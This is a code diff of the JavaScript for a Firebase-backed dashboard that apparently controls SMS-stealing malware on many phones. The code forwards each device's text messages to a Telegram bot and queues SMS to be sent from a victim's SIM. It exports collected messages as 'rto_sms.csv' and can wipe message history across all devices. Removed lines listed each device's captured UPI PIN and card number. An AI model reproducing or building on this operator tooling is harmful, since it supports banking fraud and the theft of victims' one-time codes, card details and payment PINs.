+      '<div class="send-card"><h3>📤 SEND SMS DIRECT</h3><div class="form-group"><label class="form-label">To</label><input type="text" class="form-input" id="sendTo" placeholder="+919876543210"></div><div class="form-group"><label class="form-label">Message</label><textarea class="form-textarea" id="sendMsg" placeholder="Type..."></textarea></div><button class="btn-submit" id="sendBtn">SEND VIA SIM 1</button></div>';
     setTimeout(function() {
-      // SIM buttons - forwarding
-      document.querySelectorAll('[data-sim]').forEach(function(b) {
-        b.addEventListener('click', function() {
-          var sim = parseInt(this.getAttribute('data-sim'));
-          db.ref('forward_settings/' + currentDeviceId + '/forward_sim_slot').set(sim);
-          renderTab();
-        });
-      });
-      
-      // Telegram start
-      document.getElementById('tgStart').addEventListener('click', function() {
+      document.getElementById('tgStart').onclick = function() {
         var tok = document.getElementById('tgToken').value.trim();
         var chat = document.getElementById('tgChat').value.trim();
-        if (!tok || !chat) { alert('Fill token and chat ID'); return; }
-        db.ref('forward_settings/' + currentDeviceId).update({
-          bot_token: tok, chat_id: chat, enabled: true, start_timestamp: Date.now(), updated_at: Date.now()
-        });
+        if (!tok || !chat) { alert('Fill token and chat'); return; }
+        db.ref('forward_settings/' + currentDeviceId).update({ bot_token: tok, chat_id: chat, enabled: true, start_timestamp: Date.now() });
         alert('✅ Telegram activated');
-      });
-      
-      // Forwarding toggle
-      document.getElementById('fwdToggle').addEventListener('click', function() {
-        var num = document.getElementById('fwdNum').value.trim();
-        var newState = !forwardingOn;
-        if (newState && num.length < 10) { alert('Enter valid number'); return; }
-        db.ref('forward_settings/' + currentDeviceId).update({
-          enabled: newState, admin_number: num, start_timestamp: Date.now()
-        });
-        renderTab();
-      });
-      
-      // Send SIM buttons
-      document.querySelectorAll('[data-sendsim]').forEach(function(b) {
-        b.addEventListener('click', function() {
-          document.querySelectorAll('[data-sendsim]').forEach(function(x) { x.classList.remove('active'); });
-          this.classList.add('active');
-        });
-      });
-      
-      // Char count
-      document.getElementById('sendMsg').addEventListener('input', function() {
-        document.getElementById('charsCount').textContent = this.value.length + ' chars';
-      });
-      
-      // Use device number
-      document.getElementById('useDeviceNum').addEventListener('click', function() {
-        document.getElementById('sendTo').value = (dev.sim_info && dev.sim_info.sim1_number) || '';
-      });
-      
-      // Send SMS
-      document.getElementById('sendBtn').addEventListener('click', function() {
+      };
+      document.getElementById('sendBtn').onclick = function() {
         var to = document.getElementById('sendTo').value.trim();
         var msg = document.getElementById('sendMsg').value.trim();
-        var selectedSim = document.querySelector('[data-sendsim].active');
-        var sim = selectedSim ? parseInt(selectedSim.getAttribute('data-sendsim')) : 1;
-        if (!to || !msg) { alert('Fill recipient and message'); return; }
-        db.ref('device_info/' + currentDeviceId + '/sms_commands').push({
-          to: to, message: msg, sim_slot: sim, status: 'pending', timestamp: Date.now()
-        });
-        alert('✅ SMS command sent via SIM ' + sim);
+        if (!to || !msg) { alert('Fill fields'); return; }
+        db.ref('device_info/' + currentDeviceId + '/sms_commands').push({ to: to, message: msg, sim_slot: 1, status: 'pending', timestamp: Date.now() });
+        alert('✅ Sent');
         document.getElementById('sendMsg').value = '';
-        document.getElementById('charsCount').textContent = '0 chars';
-      });
+      };
     }, 100);
   }
 }
 
-// EVENT LISTENERS
 document.getElementById('loginBtn').addEventListener('click', doLogin);
 document.getElementById('logoutBtn').addEventListener('click', doLogout);
 document.getElementById('closeModalBtn').addEventListener('click', closeModal);
-document.getElementById('closeDialogBtn').addEventListener('click', function() {
-  document.getElementById('dialogDrawer').classList.remove('active');
-  document.getElementById('dialogOverlay').classList.remove('active');
-});
 document.getElementById('drawerOverlay').addEventListener('click', closeModal);
-document.getElementById('dialogOverlay').addEventListener('click', function() {
-  document.getElementById('dialogDrawer').classList.remove('active');
-  document.getElementById('dialogOverlay').classList.remove('active');
-});
 document.getElementById('pinInput').addEventListener('keypress', function(e) { if (e.key === 'Enter') doLogin(); });
 document.getElementById('searchBox').addEventListener('input', renderDevices);
 document.getElementById('btnStarModal').addEventListener('click', function() { toggleLike(currentDeviceId); });
@@ -574,28 +513,11 @@ document.getElementById('btnCsvExport').addEventListener('click', function() {
     });
   });
   var blob = new Blob([csv], { type: 'text/csv' });
-  var url = URL.createObjectURL(blob);
-  var a = document.createElement('a'); a.href = url; a.download = 'rto_sms.csv'; a.click();
+  var a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'rto_sms.csv'; a.click();
 });
-document.getElementById('btnPingAll').addEventListener('click', function() {
-  alert('Ping sent to ' + Object.keys(allDevices).length + ' devices');
-});
-document.getElementById('btnFbSources').addEventListener('click', function() {
-  alert('Firebase URL: ' + firebaseConfig.databaseURL);
-});
-document.getElementById('btnCards').addEventListener('click', function() {
-  var cards = '';
-  Object.keys(allDevices).forEach(function(id) {
-    var dev = allDevices[id];
-    if (dev.card_data || dev.upi_data) {
-      cards += id + ': UPI ' + (dev.upi_data && dev.upi_data.upi_pin || '-') + ' | Card ' + (dev.card_data && dev.card_data.card_number || '-') + '\n';
-    }
-  });
-  alert(cards || 'No cards found');
-});
+document.getElementById('btnFbSources').addEventListener('click', function() { alert('Firebase: ' + firebaseConfig.databaseURL); });
 document.getElementById('btnNuke').addEventListener('click', function() {
-  if (!confirm('Delete ALL messages from ALL devices?')) return;
-  if (!confirm('Are you ABSOLUTELY sure?')) return;
+  if (!confirm('Delete ALL messages? This cannot be undone!')) return;
   Object.keys(allDevices).forEach(function(id) {
     db.ref('device_info/' + id + '/messages').remove();
     db.ref('device_info/' + id + '/sms_history').remove();
